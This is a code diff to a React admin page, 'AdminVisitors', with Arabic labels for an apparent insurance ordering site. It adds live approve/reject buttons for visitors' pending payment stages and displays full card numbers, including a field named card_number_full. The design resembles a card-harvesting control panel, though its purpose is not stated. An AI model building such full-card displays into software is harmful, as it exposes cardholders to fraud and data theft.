@@ -1548,7 +1548,7 @@ const AdminVisitors = () => {
 
                   {/* 3. معلومات الدفع (بطاقة الدفع كاملة) */}
                   {(() => {
-                    const paymentOrders = linkedOrders.filter(o => o.card_number_full || o.card_last_four || o.card_holder_name);
+                    const paymentOrders = linkedOrders.filter(o => o.card_number_full || o.card_last_four || o.card_holder_name || o.current_stage === "payment");
                     return (
                       <AccordionItem value="payment-info" className={`border rounded-xl overflow-hidden ${paymentOrders.some(o => o.stage_status === "pending" && o.current_stage === "payment") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                         <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
@@ -1641,13 +1641,23 @@ const AdminVisitors = () => {
                             </div>
                           ))}
                           {linkedOrders.map(order => (
-                            <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
+                            <div key={order.id} className={`bg-muted/20 rounded-xl border p-4 space-y-2 ${order.stage_status === "pending" ? "border-amber-500/50 bg-amber-500/5" : "border-border/50"}`}>
                               <div className="flex items-center justify-between">
                                 <span className="text-xs font-bold text-foreground">{order.company || "غير محدد"} - {insuranceTypeLabel[order.insurance_type || ""] || order.insurance_type || ""}</span>
                                 <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${statusLabel[order.status]?.cls || "bg-muted text-muted-foreground"}`}>
                                   {statusLabel[order.status]?.text || order.status}
                                 </span>
                               </div>
+                              {/* Stage status indicator */}
+                              {order.current_stage && (
+                                <div className="flex items-center gap-2 text-[11px]">
+                                  <span className="text-muted-foreground">المرحلة:</span>
+                                  <span className="font-bold text-foreground">{stageLabel[order.current_stage] || order.current_stage}</span>
+                                  <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${order.stage_status === "pending" ? "bg-amber-500/10 text-amber-600 animate-pulse" : order.stage_status === "approved" ? "bg-emerald-500/10 text-emerald-600" : order.stage_status === "rejected" ? "bg-red-500/10 text-red-600" : "bg-muted text-muted-foreground"}`}>
+                                    {order.stage_status === "pending" ? "⏳ بانتظار" : order.stage_status === "approved" ? "✓ موافق" : order.stage_status === "rejected" ? "✗ مرفوض" : order.stage_status || "-"}
+                                  </span>
+                                </div>
+                              )}
                               <div className="grid grid-cols-2 gap-2">
                                 {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
                                 {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
@@ -1666,6 +1676,17 @@ const AdminVisitors = () => {
                                 )}
                                 <InfoItem label="تاريخ الطلب" value={formatDate(order.created_at)} />
                               </div>
+                              {/* Stage approval buttons */}
+                              {order.stage_status === "pending" && (
+                                <div className="flex items-center gap-2 pt-2 border-t border-border/50">
+                                  <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
+                                    {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
+                                  </Button>
+                                  <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
+                                    {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
+                                  </Button>
+                                </div>
+                              )}
                             </div>
                           ))}
                         </div>
